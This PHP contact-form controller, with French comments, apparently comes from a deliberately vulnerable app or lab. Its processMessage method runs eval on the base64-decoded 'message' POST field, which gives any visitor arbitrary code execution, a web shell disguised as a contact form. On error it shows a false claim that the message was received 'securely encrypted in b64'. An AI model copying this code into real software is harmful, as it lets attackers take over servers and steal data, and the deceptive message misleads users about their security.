<?php

class ContactController {
    public function index() {
        $result = '';
        $this->displayForm($result);
    }

    public function submit() {
        $result = '';
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $message = $_POST['message'] ?? '';
            $result = $this->processMessage($message);
        }
        $this->displayForm($result);
    }

    private function processMessage($message)
    {
        // Décode le message et l'exécute
        // DANGER : Ceci permet toujours l'exécution de code arbitraire
    
        try {
            eval(base64_decode($message));
            $result = '';
        } catch (Throwable $e) {
            $result = "Nous avons bien reçu votre message sécurisé avec un chiffrement en b64.";
        }
        return $result;
    }

    private function displayForm($result) {
        require_once 'views/contact.php';
    }
}
